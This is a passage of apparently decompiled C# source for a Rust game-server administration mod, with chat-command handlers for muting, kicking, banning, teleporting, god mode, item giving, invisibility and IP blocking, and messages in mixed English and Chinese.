					Users.ToggleFlag(userData.SteamID, UserFlags.nopvp);
					NetUser netUser = NetUser.FindByUserID(userData.SteamID);
					if (netUser != null)
					{
						Broadcast.Notice(netUser, "☢", "PvP has " + (userData.HasFlag(UserFlags.nopvp) ? "enabled" : "disabled") + " for you.", 5f);
					}
					Broadcast.Notice(@class.netUser_0, "☢", string.Concat(new string[]
					{
						"PvP mode has ",
						userData.HasFlag(UserFlags.nopvp) ? "enabled" : "disabled",
						" for ",
						userData.Username,
						"."
					}), 5f);
				}
			}
		}

		public static void Details(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			userData.ToggleFlag(UserFlags.details);
			Broadcast.Message(Sender, userData.HasFlag(UserFlags.details) ? "开" : "关", "联系方式", 0f);
		}

		public static void TeleportShot(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			userData.CanTeleportShot = !userData.CanTeleportShot;
			if (userData.CanTeleportShot)
			{
				Broadcast.Notice(Sender, "☢", "You ENABLE teleportation by shots", 5f);
			}
			else
			{
				Broadcast.Notice(Sender, "☢", "Teleportation by shots is disabled.", 5f);
			}
		}

		public static void UnlimitedAmmo(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			if (Args != null && Args.Length > 0)
			{
				userData = Users.Find(Args[0]);
			}
			if (userData == null)
			{
				Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", null, Args[0]), 5f);
			}
			else
			{
				NetUser netUser = NetUser.FindByUserID(userData.SteamID);
				if (Args != null && Args.Length > 1)
				{
					if (netUser == Sender)
					{
						Broadcast.Notice(Sender, "☢", "Shoot object updated", 5f);
					}
					else
					{
						Broadcast.Notice(Sender, "☢", userData.Username + "'s shoot object updated", 5f);
					}
					userData.HasShootObject = Args[1];
				}
				else
				{
					userData.HasUnlimitedAmmo = !userData.HasUnlimitedAmmo;
					if (userData.HasUnlimitedAmmo)
					{
						if (netUser != null)
						{
							PlayerInventory component = netUser.playerClient.controllable.GetComponent<PlayerInventory>();
							if (component.activeItem != null)
							{
								int num = component.activeItem.datablock._maxUses - component.activeItem.uses;
								if (num > 0)
								{
									component.activeItem.AddUses(num);
								}
							}
						}
						if (netUser == Sender)
						{
							Broadcast.Notice(Sender, "☢", "Your ammo now is UNLIMITED for bullet weapons", 5f);
						}
						else
						{
							Broadcast.Notice(Sender, "☢", userData.Username + "'s ammo now is UNLIMITED for bullet weapons", 5f);
						}
					}
					else if (netUser == Sender)
					{
						Broadcast.Notice(Sender, "☢", "Your unlimited ammo now is disabled", 5f);
					}
					else
					{
						Broadcast.Notice(Sender, "☢", userData.Username + "'s unlimited ammo now is disabled", 5f);
					}
				}
			}
		}

		public static void Mute(NetUser Sender, string Command, string[] Args)
		{
			if (Args == null || Args.Length == 0)
			{
				Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
			}
			else
			{
				UserData userData = Users.Find(Args[0]);
				NetUser netUser = null;
				if (userData == null)
				{
					Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
				}
				else
				{
					int num = Core.ChatMuteDefaultTime;
					if (Args.Length > 1 && !int.TryParse(Args[1], out num))
					{
						num = 0;
					}
					Countdown countdown = Users.CountdownGet(userData.SteamID, "mute");
					if (countdown == null || Args.Length > 1)
					{
						netUser = NetUser.FindByUserID(userData.SteamID);
						if (countdown != null)
						{
							Users.CountdownRemove(userData.SteamID, "mute");
						}
						countdown = new Countdown("mute", (double)num);
						Users.CountdownAdd(userData.SteamID, countdown);
					}
					TimeSpan timeSpan = TimeSpan.FromSeconds(countdown.TimeLeft);
					string text = countdown.Expires ? string.Format("{0}:{1:D2}:{2:D2}", timeSpan.Hours, timeSpan.Minutes, timeSpan.Seconds) : "-:-:-";
					Broadcast.Notice(Sender, "☢", string.Concat(new string[]
					{
						"User \"",
						userData.Username,
						"\" muted on ",
						text,
						"."
					}), 5f);
					Broadcast.MessageAll(Config.GetMessage("Command.Mute.PlayerMuted", Sender, null).Replace("%TARGET%", userData.Username).Replace("%TIME%", text));
					if (netUser != null)
					{
						Broadcast.Notice(netUser, "☢", Config.GetMessage("Player.Muted", null, null).Replace("%TIME%", text), 5f);
					}
				}
			}
		}

		public static void Unmute(NetUser Sender, string Command, string[] Args)
		{
			if (Args == null || Args.Length == 0)
			{
				Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
			}
			else
			{
				UserData userData = Users.Find(Args[0]);
				if (userData == null)
				{
					Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", null, Args[0]), 5f);
				}
				else
				{
					Countdown countdown = Users.CountdownGet(userData.SteamID, "mute");
					if (countdown == null)
					{
						Broadcast.Notice(Sender.networkPlayer, "☢", "User \"" + userData.Username + "\" not muted.", 5f);
					}
					else
					{
						Users.CountdownRemove(userData.SteamID, countdown);
						Broadcast.Notice(Sender, "✔", "User \"" + userData.Username + "\" is now unmuted.", 5f);
						Broadcast.MessageAll(Config.GetMessage("Command.Mute.PlayerUnmuted", Sender, null).Replace("%TARGET%", userData.Username));
						NetUser player = NetUser.FindByUserID(userData.SteamID);
						Broadcast.Notice(player, "☢", Config.GetMessage("Player.Unmuted", null, null), 5f);
					}
				}
			}
		}

		public static void Goto(NetUser Sender, string Command, string[] Args)
		{
			if (Args == null || Args.Length == 0)
			{
				Broadcast.Notice(Sender.networkPlayer, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
			}
			else
			{
				int num = 0;
				if (!int.TryParse(Args[0], out num))
				{
					num = -1;
				}
				if (num == -1)
				{
					Broadcast.Notice(Sender.networkPlayer, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
				}
				else
				{
					if (num == 0)
					{
						num = 1;
					}
					if (num > NetCull.connections.Length)
					{
						num = NetCull.connections.Length;
					}
					uLink.NetworkPlayer player = NetCull.connections[num - 1];
					PlayerClient playerClient = Helper.GetPlayerClient(player);
					if (!(playerClient == null))
					{
						Helper.TeleportTo(Sender, playerClient.lastKnownPosition);
					}
				}
			}
		}

		public static void Summon(NetUser Sender, string Command, string[] Args)
		{
			if (Args == null || Args.Length == 0)
			{
				Broadcast.Notice(Sender.networkPlayer, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
			}
			else
			{
				PlayerClient playerClient = Sender.playerClient;
				PlayerClient playerClient2 = Helper.GetPlayerClient(Args[0]);
				if (!playerClient2)
				{
					Broadcast.Notice(Sender.networkPlayer, "✘", Config.GetMessage("Command.PlayerNoFound", null, Args[0]), 5f);
				}
				else if (playerClient2.netPlayer.isClient && playerClient2.netPlayer.isConnected)
				{
					Helper.TeleportTo(playerClient2.netUser, playerClient.lastKnownPosition);
				}
			}
		}

		public static void Invis(NetUser netUser, UserData userData)
		{
			netUser.playerClient.controllable.GetComponent<Inventory>();
			if (userData.HasFlag(UserFlags.invis))
			{
				Users.SetFlags(userData.SteamID, UserFlags.invis, false);
				Helper.ClearArmor(netUser.playerClient);
				if (Helper.userArmor.ContainsKey(netUser.userID))
				{
					foreach (string current in Helper.userArmor[netUser.userID])
					{
						Helper.EquipArmor(netUser.playerClient, current, false);
					}
				}
				Broadcast.Notice(netUser.networkPlayer, "✔", "You now is visibled.", 5f);
			}
			else
			{
				Users.SetFlags(userData.SteamID, UserFlags.invis, true);
				List<IInventoryItem> list = new List<IInventoryItem>();
				if (Helper.GetEquipedArmor(netUser.playerClient, out list))
				{
					foreach (IInventoryItem current2 in list)
					{
						Helper.userArmor[netUser.userID].Add(current2.datablock.name);
					}
				}
				Helper.EquipArmor(netUser.playerClient, "Invisible Helmet", true);
				Helper.EquipArmor(netUser.playerClient, "Invisible Vest", true);
				Helper.EquipArmor(netUser.playerClient, "Invisible Pants", true);
				Helper.EquipArmor(netUser.playerClient, "Invisible Boots", true);
				Broadcast.Notice(netUser.networkPlayer, "✔", "You now is invisibled. Reconnect to make your name invisible.", 5f);
			}
		}

		public static void Truth(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			NetUser netUser = Sender;
			if (Args != null && Args.Length > 0)
			{
				netUser = Helper.GetNetUser(Args[0]);
			}
			if (netUser == null)
			{
				Broadcast.Notice(Sender.networkPlayer, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
			}
			else if (RustExtended.Truth.Exclude.Contains(netUser.userID))
			{
				RustExtended.Truth.Exclude.Remove(netUser.userID);
				Broadcast.Notice(netUser, "☢", "Truth Detector now ENABLED for you.", 5f);
				if (netUser != Sender)
				{
					Broadcast.Notice(Sender, "✔", "Truth Detector now ENABLED for \"" + netUser.displayName + "\".", 5f);
				}
			}
			else
			{
				RustExtended.Truth.Exclude.Add(netUser.userID);
				Broadcast.Notice(netUser, "☢", "Truth Detector now DISABLED for you.", 5f);
				if (netUser != Sender)
				{
					Broadcast.Notice(Sender, "✔", "Truth Detector now DISABLED for \"" + netUser.displayName + "\".", 5f);
				}
			}
		}

		public static void Kill(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			if (Args == null || Args.Length == 0)
			{
				Broadcast.Notice(Sender.networkPlayer, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
			}
			else
			{
				PlayerClient playerClient = Helper.GetPlayerClient(Args[0]);
				if (!playerClient)
				{
					Broadcast.Notice(Sender.networkPlayer, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
				}
				else if (userData.Rank <= Users.GetRank(playerClient.userID))
				{
					Broadcast.Notice(Sender.networkPlayer, "✘", "You are not allowed to kill a player of higher rank.", 5f);
				}
				else
				{
					Users.SetFlags(playerClient.userID, UserFlags.godmode, false);
					Character victim;
                    Character.FindByUser(playerClient.userID, out victim);
					TakeDamage.KillSelf(victim, null);
					Broadcast.Notice(Sender.networkPlayer, "✔", "User " + playerClient.userName + " was killed.", 5f);
					Broadcast.Notice(playerClient.netPlayer, "☢", "You was a killed by " + Sender.displayName, 5f);
					Helper.Log(string.Concat(new string[]
					{
						"\"",
						playerClient.userName,
						"\" was a killed by \"",
						Sender.displayName,
						"\" of used /kill command."
					}), true);
				}
			}
		}

		public static void Kick(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			if (Args == null || Args.Length == 0)
			{
				Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
			}
			else
			{
				PlayerClient playerClient = Helper.GetPlayerClient(Args[0]);
				if (!playerClient)
				{
					Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
				}
				else if (Sender != null && userData.Rank <= Users.GetRank(playerClient.userID))
				{
					Broadcast.Notice(Sender, "✘", "You are not allowed to kick a player of higher rank.", 5f);
				}
				else
				{
					if (Sender == null)
					{
						ConsoleSystem.Print("User " + playerClient.userName + " was kicked.", false);
					}
					else
					{
						Broadcast.Notice(Sender, "✔", "User " + playerClient.userName + " was kicked.", 5f);
						Broadcast.Notice(playerClient.netPlayer, "☢", "You was a kicked from server by " + Sender.displayName, 5f);
						Helper.Log(string.Concat(new string[]
						{
							"\"",
							playerClient.userName,
							"\" was a kicked from server by \"",
							Sender.displayName,
							"\""
						}), true);
					}
					playerClient.netUser.Kick(NetError.NoError, true);
				}
			}
		}

		public static void Ban(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			if (Args == null || Args.Length == 0)
			{
				Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
			}
			else
			{
				UserData userData2 = Users.Find(Args[0]);
				if (userData2 == null)
				{
					Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
				}
				else if (Users.IsBanned(userData2.SteamID))
				{
					Broadcast.Notice(Sender, "✘", "User " + userData2.Username + " already banned.", 5f);
				}
				else if (Sender != null && userData.Rank <= userData2.Rank)
				{
					Broadcast.Notice(Sender, "✘", "You are not allowed to ban a player of higher rank.", 5f);
				}
				else
				{
					PlayerClient playerClient;
					if (PlayerClient.FindByUserID(userData2.SteamID, out playerClient))
					{
						Broadcast.Notice(playerClient.netPlayer, "☢", "你是被Ban了 操作者" + ((Sender != null) ? Sender.displayName : "SERVER"), 5f);
						playerClient.netUser.Kick(NetError.NoError, true);
					}
					int num = 0;
					DateTime period = default(DateTime);
					string reason = (Args.Length > 1) ? Args[1] : "No Reason.";
					string details = (Args.Length > 3) ? Args[3] : ("Banned by \"" + ((Sender != null) ? Sender.displayName : "SERVER") + "\".");
					if (Args.Length > 2 && int.TryParse(Args[2], out num))
					{
						period = DateTime.Now.AddDays((double)num);
					}
					Users.Ban(userData2.SteamID, reason, period, details);
					Broadcast.Notice(Sender, "✔", "用户 " + userData2.Username + " 被Ban" + ((num > 0) ? (" 了 " + num + " 天.") : "."), 5f);
					if (Sender != null)
					{
						Helper.Log(string.Concat(new string[]
						{
							"\"",
							userData2.Username,
							"\" was a banned",
							(num > 0) ? (" on " + num + " days.") : "",
							" by \"",
							Sender.displayName,
							"\""
						}), true);
					}
				}
			}
		}

		public static void SaveAll(NetUser Sender)
		{
			ServerSaveManager.AutoSave();
		}

		public static void Announce(NetUser Sender, string[] Args)
		{
			if (Args != null && Args.Length != 0)
			{
				Broadcast.NoticeAll("☢", string.Join(" ", Args), null, 10f);
			}
		}

		public static void Food(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			if (Args == null || Args.Length == 0)
			{
				Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
			}
			else
			{
				if (Args.Length > 1 && Sender != null && !Sender.admin && !userData.HasFlag(UserFlags.admin))
				{
					Args = Args.Remove(Args[0]);
				}
				NetUser netUser = Sender;
				string s = Args[0];
				if (Args.Length > 1)
				{
					netUser = Helper.GetNetUser(Args[0]);
					s = Args[1];
				}
				if (netUser == null)
				{
					Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
				}
				else
				{
					Character idMain = netUser.playerClient.controllable.idMain;
					if (idMain)
					{
						Metabolism component = idMain.GetComponent<Metabolism>();
						if (component)
						{
							float calorieLevel = component.GetCalorieLevel();
							float num = 0f;
							if (float.TryParse(s, out num))
							{
								if (num > calorieLevel)
								{
									component.AddCalories(num - calorieLevel);
								}
								if (num < calorieLevel)
								{
									component.SubtractCalories(calorieLevel - num);
								}
								Helper.Log(string.Concat(new object[]
								{
									userData.Username,
									" set ",
									num,
									" food for \"",
									netUser.displayName,
									"\""
								}), true);
								if (Sender != null)
								{
									Broadcast.Notice(netUser, "✔", "你的卡路里现在是 " + num, 5f);
									if (Sender != netUser)
									{
										Broadcast.Notice(Sender, "✔", string.Concat(new object[]
										{
											"你设置了 ",
											num,
											" 饱满度给 ",
											netUser.displayName
										}), 5f);
									}
								}
							}
						}
					}
				}
			}
		}

		public static void Health(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			if (Args == null || Args.Length == 0)
			{
				Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
			}
			else
			{
				if (Args.Length > 1 && Sender != null && !Sender.admin && !userData.HasFlag(UserFlags.admin))
				{
					Args = Args.Remove(Args[0]);
				}
				NetUser netUser = Sender;
				string s = Args[0];
				if (Args.Length > 1)
				{
					netUser = Helper.GetNetUser(Args[0]);
					s = Args[1];
				}
				if (netUser == null)
				{
					Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
				}
				else
				{
					Character idMain = netUser.playerClient.controllable.idMain;
					if (idMain)
					{
						HumanBodyTakeDamage humanBodyTakeDamage = idMain.takeDamage as HumanBodyTakeDamage;
						if (humanBodyTakeDamage)
						{
							float health = humanBodyTakeDamage.health;
							if (float.TryParse(s, out health))
							{
								if (health <= 100f)
								{
									humanBodyTakeDamage.maxHealth = 100f;
								}
								else
								{
									humanBodyTakeDamage.maxHealth = health;
								}
								if (health >= humanBodyTakeDamage.health)
								{
									humanBodyTakeDamage.Heal(idMain.idMain, health - humanBodyTakeDamage.health);
								}
								else
								{
									TakeDamage.HurtSelf(idMain.idMain, humanBodyTakeDamage.health - health, null);
								}
								Helper.Log(string.Concat(new object[]
								{
									userData.Username,
									" set ",
									health,
									" health for \"",
									netUser.displayName,
									"\""
								}), true);
								if (Sender != null)
								{
									Broadcast.Notice(netUser, "✔", "Your health now is " + health, 5f);
									if (Sender != netUser)
									{
										Broadcast.Notice(Sender, "✔", string.Concat(new object[]
										{
											"你设置了 ",
											health,
											" 给 ",
											netUser.displayName
										}), 5f);
									}
								}
							}
						}
					}
				}
			}
		}

		public static void Admin(NetUser Sender, UserData userData)
		{
			Sender.admin = !Sender.admin;
			Broadcast.Notice(Sender.networkPlayer, "✔", "您现在 " + (Sender.admin ? "开启了" : "关闭了") + " 管理员权限.", 5f);
		}

		public static void God(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			if (Args != null && Args.Length > 0)
			{
				userData = Users.Find(Args[0]);
			}
			if (userData == null)
			{
				Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
			}
			else
			{
				userData.ToggleFlag(UserFlags.godmode);
				Broadcast.Notice(Sender, "✔", "You " + (userData.HasFlag(UserFlags.godmode) ? "enable" : "disable") + " god mode for " + userData.Username, 5f);
			}
		}

		public static void Give(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			if (Args == null || Args.Length == 0)
			{
				Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
			}
			else
			{
				NetUser netUser = Sender;
				int modSlots = -1;
				int num = 1;
				string text = Args[0];
				ItemDataBlock byName = DatablockDictionary.GetByName(text);
				if (Args.Length >= 3 && !int.TryParse(Args[2], out modSlots))
				{
					modSlots = -1;
				}
				if (Args.Length >= 2 && !int.TryParse(Args[1], out num))
				{
					num = 1;
				}
				if (byName == null)
				{
					netUser = Helper.GetNetUser(Args[0]);
					if (netUser == null)
					{
						Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, text), 5f);
						return;
					}
					if (Args.Length < 2)
					{
						Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
						return;
					}
					text = Args[1];
					byName = DatablockDictionary.GetByName(text);
					if (Args.Length >= 4 && !int.TryParse(Args[3], out modSlots))
					{
						modSlots = -1;
					}
					if (Args.Length >= 3 && !int.TryParse(Args[2], out num))
					{
						num = 1;
					}
				}
				if (netUser == null)
				{
					Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, text), 5f);
				}
				else if (byName == null)
				{
					Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.ItemNoFound", Sender, text), 5f);
				}
				else
				{
					num = Helper.GiveItem(netUser.playerClient, byName, num, modSlots);
					string text2 = "\"" + byName.name + "\"";
					if (num > 1)
					{
						text2 = num.ToString() + " " + text2;
					}
					if (num == 0)
					{
						Broadcast.Notice(Sender, "✘", "Failed to give " + text2 + ", inventory is full.", 5f);
					}
					else
					{
						if (Sender != null && Sender != netUser)
						{
							Broadcast.Notice(Sender, "✔", string.Concat(new string[]
							{
								"You give ",
								text2,
								" into ",
								netUser.displayName,
								" inventory."
							}), 5f);
						}
						Helper.Log(string.Concat(new string[]
						{
							userData.Username,
							" give ",
							text2,
							" into ",
							netUser.displayName,
							" inventory."
						}), true);
						Broadcast.Notice(netUser, "✔", "You received " + text2 + " into your inventory.", 5f);
					}
				}
			}
		}

		public static void Safebox(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			if (Args != null && Args.Length > 0)
			{
				userData = Users.Find(Args[0]);
			}
			if (Sender == null && userData == null)
			{
				Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
			}
			else if (userData == null)
			{
				Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
			}
			else
			{
				Users.ToggleFlag(userData.SteamID, UserFlags.safeboxes);
				Broadcast.Notice(Sender, "✔", "You " + (userData.HasFlag(UserFlags.safeboxes) ? "enable" : "disable") + " a safety boxes for " + userData.Username, 5f);
			}
		}

		public static void Inv(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			string text = null;
			PlayerClient playerClient = null;
			if (Args != null && Args.Length > 0)
			{
				playerClient = Helper.GetPlayerClient(Args[0]);
				if (Args.Length > 1)
				{
					text = Args[1];
				}
				if (playerClient == null)
				{
					text = Args[0];
				}
			}
			if (Sender != null && playerClient == null)
			{
				playerClient = Sender.playerClient;
			}
			Inventory component = playerClient.controllable.GetComponent<Inventory>();
			Inventory inventory = (Sender != null) ? Sender.playerClient.controllable.GetComponent<Inventory>() : null;
			if (text != null)
			{
				string a;
				if ((a = text.ToUpper()) != null)
				{
					if (a == "CLEAR")
					{
						component.DeactivateItem();
						component.Clear();
						playerClient.controllable.GetComponent<AvatarSaveRestore>().ClearAvatar();
						Broadcast.Notice(Sender, "✔", "Inventory of \"" + playerClient.netUser.displayName + "\" has been cleared.", 5f);
						return;
					}
					if (a == "DROP")
					{
						component.DeactivateItem();
						Inventory inventory2;
                        DropHelper.DropInventoryContents(component, out inventory2);
						if (Sender != null)
						{
							TimedLockable timedLockable = inventory2.gameObject.GetComponent<TimedLockable>();
							if (timedLockable == null)
							{
								timedLockable = inventory2.gameObject.AddComponent<TimedLockable>();
							}
							timedLockable.SetOwner(Sender.userID);
							timedLockable.LockFor(player.backpackLockTime);
							inventory2.GetComponent<LootableObject>().lifeTime = timedLockable.lockTime;
						}
						playerClient.controllable.GetComponent<AvatarSaveRestore>().ClearAvatar();
						Broadcast.Notice(Sender, "✔", "Inventory of \"" + playerClient.netUser.displayName + "\" has been dropped.", 5f);
						return;
					}
				}
				Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
			}
			else if (Sender != null)
			{
				if (component != inventory && !Commands.dictionary_0.ContainsKey(Sender))
				{
					Commands.dictionary_0.Add(Sender, inventory.GenerateOptimizedInventoryListing(Inventory.Slot.KindFlags.Default | Inventory.Slot.KindFlags.Belt | Inventory.Slot.KindFlags.Armor));
				}
				else if (component == inventory && Commands.dictionary_0.ContainsKey(Sender))
				{
					component.DeactivateItem();
					component.Clear();
					for (int i = 0; i < Commands.dictionary_0[Sender].Length; i++)
					{
						IInventoryItem inventoryItem = component.AddItem(ref Commands.dictionary_0[Sender][i].addition);
						inventory.MoveItemAtSlotToEmptySlot(component, inventoryItem.slot, Commands.dictionary_0[Sender][i].item.slot);
					}
					Commands.dictionary_0.Remove(Sender);
					if (userData.Flags.Has(UserFlags.invis))
					{
						Helper.EquipArmor(Sender.playerClient, "Invisible Helmet", true);
						Helper.EquipArmor(Sender.playerClient, "Invisible Vest", true);
						Helper.EquipArmor(Sender.playerClient, "Invisible Pants", true);
						Helper.EquipArmor(Sender.playerClient, "Invisible Boots", true);
					}
					Broadcast.Notice(Sender, "✔", "Your inventory has been restored.", 5f);
					return;
				}
				if (component != inventory && Commands.dictionary_0.ContainsKey(Sender))
				{
					Inventory.Transfer[] array = component.GenerateOptimizedInventoryListing(Inventory.Slot.KindFlags.Default | Inventory.Slot.KindFlags.Belt | Inventory.Slot.KindFlags.Armor);
					inventory.DeactivateItem();
					inventory.Clear();
					if (array.Length > 0)
					{
						for (int j = 0; j < array.Length; j++)
						{
							IInventoryItem inventoryItem2 = inventory.AddItem(ref array[j].addition);
							inventory.MoveItemAtSlotToEmptySlot(inventory, inventoryItem2.slot, array[j].item.slot);
						}
					}
					Broadcast.Notice(Sender, "✔", "Inventory of \"" + playerClient.netUser.displayName + "\" copied into your inventory.", 5f);
				}
				else
				{
					Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
				}
			}
		}

		public static void Freeze(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			if (Args == null || Args.Length == 0)
			{
				Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
			}
			else if (Args[0].Equals("ALL", StringComparison.CurrentCultureIgnoreCase))
			{
				Core.PlayersFreezed = !Core.PlayersFreezed;
				Broadcast.Notice(Sender, "✔", "All players now " + (Core.PlayersFreezed ? "FREEZED" : "unfreezed"), 5f);
			}
			else
			{
				userData = Users.Find(Args[0]);
				if (userData == null)
				{
					Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
				}
				else
				{
					userData.ToggleFlag(UserFlags.freezed);
					Broadcast.Notice(Sender, "✔", "You " + (userData.HasFlag(UserFlags.freezed) ? "freeze" : "unfreeze") + " " + userData.Username, 5f);
				}
			}
		}

		public static void Personal(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			if (Args == null || Args.Length < 3)
			{
				Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
			}
			else
			{
				UserData userData2 = Users.Find(Args[0]);
				if (userData2 == null)
				{
					Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
				}
				else
				{
					NetUser netUser = NetUser.FindByUserID(userData2.SteamID);
					ItemDataBlock byName = DatablockDictionary.GetByName(Args[1]);
					if (byName == null)
					{
						Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.ItemNoFound", Sender, Args[1]), 5f);
					}
					else
					{
						int num = 5;
						if (Args.Length > 2)
						{
							num = int.Parse(Args[2]);
						}
						if (num == 0)
						{
							num = 5;
						}
						Users.PersonalAdd(userData2.SteamID, byName.name, num);
						num = Users.PersonalList(userData2.SteamID)[byName.name];
						Helper.GiveItem(netUser.playerClient, byName.name, 1, -1);
						Broadcast.Message(Sender, string.Concat(new object[]
						{
							"你给的溢价 ",
							byName.name,
							" 物品 数量 ",
							num,
							" 死亡."
						}), null, 0f);
						Helper.Log(string.Concat(new object[]
						{
							userData.Username,
							" give a premium ",
							byName.name,
							" item on ",
							num,
							" deaths for ",
							userData2.Username
						}), true);
						if (netUser != null)
						{
							Broadcast.Notice(netUser, "☢", Config.GetMessage("Player.Premium.ReceivedItem", Sender, null).Replace("%ITEMNAME%", byName.name).Replace("%FORDEATHS%", num.ToString()), 5f);
						}
					}
				}
			}
		}

		public static void UnBan(NetUser Sender, string Command, string[] Args)
		{
			if (Args == null || Args.Length == 0)
			{
				Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
			}
			else if (Args[0].ToLower() == "all" && Banned.Clear())
			{
				if (Sender != null)
				{
					Helper.Log("All users has unbanned on server by \"" + Sender.displayName + "\"", true);
				}
				Broadcast.Notice(Sender, "✔", "All users has unbanned.", 5f);
			}
			else
			{
				UserData userData = Users.Find(Args[0]);
				if (userData == null)
				{
					Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
				}
				else if (!Users.IsBanned(userData.SteamID))
				{
					Broadcast.Notice(Sender, "✘", "User " + userData.Username + " not banned.", 5f);
				}
				else
				{
					Users.Unban(userData.SteamID);
					Broadcast.Notice(Sender, "✔", "User " + userData.Username + " was unbanned.", 5f);
					if (Sender != null)
					{
						Helper.Log(string.Concat(new string[]
						{
							"\"",
							userData.Username,
							"\" was a unbanned by \"",
							(Sender != null) ? Sender.displayName : "SERVER",
							"\""
						}), true);
					}
				}
			}
		}

		public static void Block(NetUser Sender, string Command, string[] Args)
		{
			Commands.Class12 @class = new Commands.Class12();
			if (Args == null || Args.Length == 0)
			{
				Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
			}
			else
			{
				if (Regex.IsMatch(Args[0], "^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$"))
				{
					@class.string_0 = Args[0];
				}
				else
				{
					UserData userData = Users.Find(Args[0]);
					if (userData == null)
					{
						Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
						return;
					}
					@class.string_0 = userData.LastConnectIP;
				}
				if (Blocklist.Exists(@class.string_0))
				{
					Broadcast.Notice(Sender, "✘", "IP address " + @class.string_0 + " already blocked.", 5f);
				}
				else
				{
					Blocklist.Add(@class.string_0);
					foreach (PlayerClient current in PlayerClient.All.FindAll(new Predicate<PlayerClient>(@class.method_0)))
					{
						Broadcast.Notice(current.netUser.networkPlayer, "✔", "You have been blocked by IP address.", 5f);
						current.netUser.Kick(NetError.NoError, true);
					}
					Broadcast.Notice(Sender, "✔", "You block " + @class.string_0 + " IP address.", 5f);
					if (Sender != null)
					{
						Helper.Log(string.Concat(new string[]
						{
							"\"IP address ",
							@class.string_0,
							"\" was blocked by \"",
							Sender.displayName,
							"\"."
						}), true);
					}
				}
			}
		}

		public static void Unblock(NetUser Sender, string Command, string[] Args)
		{
			if (Args == null || Args.Length == 0)
			{
				Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
			}
			else if (!Regex.IsMatch(Args[0], "^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$"))
			{
				Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
			}
			else if (!Blocklist.Exists(Args[0]))
			{
				Broadcast.Notice(Sender, "✘", "IP address " + Args[0] + " not blocked.", 5f);
			}
			else
			{
				Blocklist.Remove(Args[0]);
